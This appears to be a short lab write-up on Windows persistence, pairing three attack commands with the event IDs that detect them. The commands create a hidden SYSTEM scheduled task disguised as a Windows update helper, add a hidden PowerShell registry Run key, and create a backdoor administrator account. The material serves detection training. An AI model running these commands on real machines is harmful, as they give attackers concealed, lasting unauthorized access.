# Persistence — Scheduled Task + Registry Run Key

## What is Persistence?
Attacker installs mechanisms so their access survives reboots.

## Attack 1 — Scheduled Task
```powershell
schtasks /create /tn "WindowsUpdateHelper" /tr "powershell.exe -WindowStyle Hidden -Command 'Write-Host Malware'" /sc onlogon /ru System /f
```
- Event ID: 4698
- Task Name: WindowsUpdateHelper
- Trigger: On every login

## Attack 2 — Registry Run Key
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHelper" /t REG_SZ /d "powershell.exe -WindowStyle Hidden" /f
```
- Sysmon Event ID: 13
- Registry path modified at startup

## Attack 3 — Backdoor Admin User
```powershell
net user HackerUser Password123! /add
net localgroup administrators HackerUser /add
```
- Event ID: 4720 (user created)
- Event ID: 4732 (added to admins)

## Detection Query
See `06-New User Created Detection.png`